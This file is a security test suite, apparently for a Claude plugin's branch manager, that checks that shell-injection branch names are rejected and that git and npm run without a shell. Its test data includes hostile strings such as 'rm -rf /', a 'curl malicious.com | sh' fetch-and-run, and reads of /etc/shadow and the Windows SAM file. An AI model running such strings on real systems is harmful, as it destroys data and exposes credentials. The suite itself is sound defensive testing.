/**
 * Security Test Suite: Command Injection Prevention
 *
 * Tests command injection vulnerabilities and their fixes across the codebase.
 * These tests ensure that user input cannot be used to execute arbitrary commands.
 */

import { describe, test, expect, beforeEach, afterEach } from 'bun:test';
import { getBranchInfo, switchBranch, pullUpdates } from '../../src/services/worker/BranchManager';
import { existsSync, mkdirSync, writeFileSync, rmSync } from 'fs';
import { join } from 'path';
import { homedir } from 'os';

const TEST_PLUGIN_PATH = join(homedir(), '.claude', 'plugins', 'marketplaces', 'thedotmack-test');

describe('Command Injection Security Tests', () => {
  describe('BranchManager - Branch Name Validation', () => {
    test('should reject branch names with shell metacharacters', async () => {
      const maliciousBranchNames = [
        'main; rm -rf /',
        'main && curl malicious.com | sh',
        'main || cat /etc/passwd',
        'main | tee /tmp/pwned',
        'main > /tmp/pwned',
        'main < /etc/passwd',
        'main & background-command',
        'main $(whoami)',
        'main `whoami`',
        'main\nwhoami',
        'main\rwhoami',
        'main\x00whoami',
      ];

      for (const branchName of maliciousBranchNames) {
        const result = await switchBranch(branchName);
        expect(result.success).toBe(false);
        expect(result.error).toContain('Invalid branch name');
      }
    });

    test('should reject branch names with double dots (directory traversal)', async () => {
      const result = await switchBranch('main/../../../etc/passwd');
      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid branch name');
    });

    test('should reject branch names starting with invalid characters', async () => {
      const invalidStarts = [
        '.hidden-branch',
        '-invalid',
        '/absolute',
      ];

      for (const branchName of invalidStarts) {
        const result = await switchBranch(branchName);
        expect(result.success).toBe(false);
        expect(result.error).toContain('Invalid branch name');
      }
    });

    test('should accept valid branch names', async () => {
      // Note: These tests will fail if not in a git repo, but the validation should pass
      const validBranchNames = [
        'main',
        'beta',
        'beta-v2',
        'feature/new-feature',
        'hotfix/urgent-fix',
        'release/1.2.3',
        'dev_test',
        'branch.name',
        'alpha123',
      ];

      for (const branchName of validBranchNames) {
        const result = await switchBranch(branchName);
        // The validation should pass (won't contain "Invalid branch name")
        // It might fail for other reasons (not a git repo, branch doesn't exist)
        if (result.error) {
          expect(result.error).not.toContain('Invalid branch name');
        }
      }
    });

    test('should reject null, undefined, and empty branch names', async () => {
      const result1 = await switchBranch('');
      expect(result1.success).toBe(false);
      expect(result1.error).toContain('Invalid branch name');

      // TypeScript prevents null/undefined, but test runtime behavior
      const result2 = await switchBranch(null as any);
      expect(result2.success).toBe(false);

      const result3 = await switchBranch(undefined as any);
      expect(result3.success).toBe(false);
    });
  });

  describe('Command Array Argument Safety', () => {
    test('should use array-based arguments for all git commands', () => {
      // Read BranchManager source to verify no string interpolation
      const branchManagerSource = Bun.file('/Users/alexnewman/Scripts/claude-mem/src/services/worker/BranchManager.ts');
      const content = branchManagerSource.text();

      content.then(text => {
        // Ensure no execSync with template literals or string concatenation
        expect(text).not.toMatch(/execSync\(`git \$\{/);
        expect(text).not.toMatch(/execSync\('git ' \+/);
        expect(text).not.toMatch(/execSync\("git " \+/);

        // Ensure spawnSync is used with array arguments
        expect(text).toContain("spawnSync('git', args");
        expect(text).toContain('shell: false');
      });
    });

    test('should never use shell=true with user input', () => {
      const branchManagerSource = Bun.file('/Users/alexnewman/Scripts/claude-mem/src/services/worker/BranchManager.ts');
      const content = branchManagerSource.text();

      content.then(text => {
        // Ensure shell: false is explicitly set
        const shellTrueMatches = text.match(/shell:\s*true/g);
        expect(shellTrueMatches).toBeNull();
      });
    });
  });

  describe('Input Sanitization Edge Cases', () => {
    test('should reject branch names with URL encoding attempts', async () => {
      const result = await switchBranch('main%20;%20rm%20-rf');
      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid branch name');
    });

    test('should reject branch names with unicode control characters', async () => {
      const controlChars = [
        'main\u0000test', // Null byte
        'main\u0008test', // Backspace
        'main\u001btest', // ESC
      ];

      for (const branchName of controlChars) {
        const result = await switchBranch(branchName);
        expect(result.success).toBe(false);
        expect(result.error).toContain('Invalid branch name');
      }
    });

    test('should handle very long branch names safely', async () => {
      const longBranchName = 'a'.repeat(1000);
      const result = await switchBranch(longBranchName);

      // Should either accept it or reject it, but never crash
      expect(result).toHaveProperty('success');
      expect(typeof result.success).toBe('boolean');
    });
  });

  describe('Cross-platform Safety', () => {
    test('should handle Windows-specific command separators', async () => {
      const windowsInjections = [
        'main & dir',
        'main && type C:\\Windows\\System32\\config\\SAM',
        'main | findstr password',
      ];

      for (const branchName of windowsInjections) {
        const result = await switchBranch(branchName);
        expect(result.success).toBe(false);
        expect(result.error).toContain('Invalid branch name');
      }
    });

    test('should handle Unix-specific command separators', async () => {
      const unixInjections = [
        'main; cat /etc/shadow',
        'main && ls -la /',
        'main | grep -r password /',
      ];

      for (const branchName of unixInjections) {
        const result = await switchBranch(branchName);
        expect(result.success).toBe(false);
        expect(result.error).toContain('Invalid branch name');
      }
    });
  });

  describe('Regression Tests for Issue #354', () => {
    test('should prevent command injection via targetBranch parameter (original vulnerability)', async () => {
      // This was the original vulnerability: targetBranch was directly interpolated
      const maliciousBranch = 'main; echo "PWNED" > /tmp/pwned.txt';
      const result = await switchBranch(maliciousBranch);

      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid branch name');

      // Verify the malicious command was NOT executed
      expect(existsSync('/tmp/pwned.txt')).toBe(false);
    });

    test('should prevent command injection in pullUpdates function', async () => {
      // pullUpdates uses info.branch which could be compromised
      // The fix validates branch names before use
      const result = await pullUpdates();

      // Should either succeed or fail safely, never execute injected commands
      expect(result).toHaveProperty('success');
      expect(typeof result.success).toBe('boolean');
    });
  });

  describe('NPM Command Safety', () => {
    test('should use array-based arguments for npm commands', () => {
      const branchManagerSource = Bun.file('/Users/alexnewman/Scripts/claude-mem/src/services/worker/BranchManager.ts');
      const content = branchManagerSource.text();

      content.then(text => {
        // Ensure execNpm uses array arguments
        expect(text).toContain("execNpm(['install']");

        // Ensure no string concatenation with npm
        expect(text).not.toMatch(/execSync\('npm install'/);
        expect(text).not.toMatch(/execShell\('npm install'/);
      });
    });
  });
});

describe('Process Manager Security Tests', () => {
  test('should validate port parameter is numeric', async () => {
    const { ProcessManager } = await import('../../src/services/process/ProcessManager');

    // Test port injection attempts
    const result1 = await ProcessManager.start(NaN);
    expect(result1.success).toBe(false);
    expect(result1.error).toContain('Invalid port');

    const result2 = await ProcessManager.start(999999);
    expect(result2.success).toBe(false);
    expect(result2.error).toContain('Invalid port');

    const result3 = await ProcessManager.start(-1);
    expect(result3.success).toBe(false);
    expect(result3.error).toContain('Invalid port');
  });

  test('should use array-based spawn arguments', () => {
    const processManagerSource = Bun.file('/Users/alexnewman/Scripts/claude-mem/src/services/process/ProcessManager.ts');
    const content = processManagerSource.text();

    content.then(text => {
      // Ensure spawn uses array arguments
      expect(text).toContain('spawn(bunPath, [script]');

      // Ensure no shell=true
      expect(text).not.toMatch(/shell:\s*true/);
    });
  });
});

describe('Bun Path Utility Security Tests', () => {
  test('should not use shell for bun version check', () => {
    const bunPathSource = Bun.file('/Users/alexnewman/Scripts/claude-mem/src/utils/bun-path.ts');
    const content = bunPathSource.text();

    content.then(text => {
      // Ensure shell: false is set
      expect(text).toContain('shell: false');

      // Ensure no shell: isWindows or shell: true
      expect(text).not.toMatch(/shell:\s*isWindows/);
      expect(text).not.toMatch(/shell:\s*true/);
    });
  });
});
